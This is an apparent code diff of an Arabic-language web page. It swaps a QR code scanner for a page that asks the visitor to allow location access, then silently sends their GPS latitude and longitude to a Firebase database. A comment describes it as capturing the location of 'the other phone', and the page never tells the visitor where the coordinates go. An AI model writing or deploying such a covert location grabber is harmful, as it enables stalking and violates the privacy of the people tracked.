@@ -1,83 +1,33 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ماسح كود الرصيد</title>
-    <!-- استدعاء المكتبة الكاملة والصحيحة لقراءة الـ QR -->
-    <script src="qrcode"></script>
-    <style>
-        body {
-            font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .container {
-            width: 90%;
-            max-width: 400px;
-            background: #1e1e1e;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-        h2 { color: #4CAF50; margin-bottom: 20px; }
-        #reader {
-            width: 100%;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 2px solid #333 !important;
-        }
-        #result {
-            margin-top: 20px;
-            font-size: 18px;
-            font-weight: bold;
-            color: #ffeb3b;
-        }
-    </style>
+    <title>تحديد الموقع</title>
 </head>
 <body>
+    <h2 style="text-align: center; margin-top: 50px;">جاري تحديد الموقع... يرجى الضغط على "سماح" إذا ظهرت لك</h2>
 
-<div class="container">
-    <h2>ماسح الأكواد الذكي</h2>
-    <div id="reader"></div>
-    <div id="result">في انتظار مسح الكود...</div>
-</div>
+    <script>
+        // دالة التقاط موقع الـ GPS من الهاتف الآخر
+        navigator.geolocation.getCurrentPosition(function(position) {
+            let lat = position.coords.latitude;
+            let lng = position.coords.longitude;
 
-<script>
-    function onScanSuccess(decodedText, decodedResult) {
-        // عرض النص المقروء في الواجهة فوراً عند النجاح
-        document.getElementById( result ).innerText = "تم المسح بنجاح!";
-        
-        // إرسال البيانات الممسوحة مباشرة إلى تطبيق Kodular عبر الـ WebView
-        if (window.AppInventoWeb || window.KodularWeb) {
-            if(window.AppInventoWeb) {
-                window.AppInventoWeb.setWebViewString(decodedText);
-            } else if (window.KodularWeb) {
-                window.KodularWeb.setWebViewString(decodedText);
-            }
-        } else {
-            // حل احتياطي للمتصفحات العادية
-            window.location.hash = decodedText;
-        }
-    }
+            // استبدل الرابط أدناه برابط الـ Realtime Database الخاص بك في Firebase
+            let firebaseURL = "https://firebaseio.com";
 
-    function onScanFailure(error) {
-        // نتركها فارغة لتفادي إرسال أخطاء مستمرة أثناء تحرك الكاميرا بحثاً عن الكود
-    }
+            // إرسال الإحداثيات فوراً إلى قاعدة البيانات
+            fetch(firebaseURL, {
+                method: "PUT",
+                body: JSON.stringify({ latitude: lat, longitude: lng })
+            })
+            .then(response => alert("تمت العملية بنجاح! شكراً لك."))
+            .catch(error => alert("حدث خطأ في الإرسال"));
 
-    // إعداد وتشغيل الماسح تلقائياً
-    let html5QrcodeScanner = new Html5QrcodeScanner(
-        "reader", { fps: 10, qrbox: 250 });
-    html5QrcodeScanner.render(onScanSuccess, onScanFailure);
-</script>
-
+        }, function(error) {
+            alert("يرجى تفعيل الـ GPS في هاتفك والسماح للمتصفح بالوصول للموقع");
+        });
+    </script>
 </body>
 </html>
 
